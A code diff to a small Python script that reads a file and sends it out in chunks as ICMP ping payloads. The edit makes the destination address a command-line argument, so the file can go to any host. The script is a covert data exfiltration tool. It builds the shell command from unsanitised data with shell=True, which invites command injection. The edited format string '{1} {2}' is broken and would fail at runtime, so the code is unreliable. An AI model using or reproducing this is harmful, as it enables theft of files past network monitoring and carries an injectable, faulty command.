@@ -1,8 +1,8 @@
 import subprocess, sys
 
-def send_icmp_packet(data):
+def send_icmp_packet(data, address):
     # Craft and send an ICMP packet using a system command
-    command = "ping -p {} 1.1.1.1".format(data)
+    command = "ping -p {1} {2}".format(data, address)
     subprocess.call(command, shell=True)
 
 def encode_file(filename):
@@ -19,7 +19,7 @@ def encode_file(filename):
 
     # Send each chunk as an ICMP packet
     for chunk in chunks:
-        send_icmp_packet(chunk)
+        send_icmp_packet(chunk, sys.argv[2])
 
 # Send file over ICMP:
 encode_file(sys.argv[1])
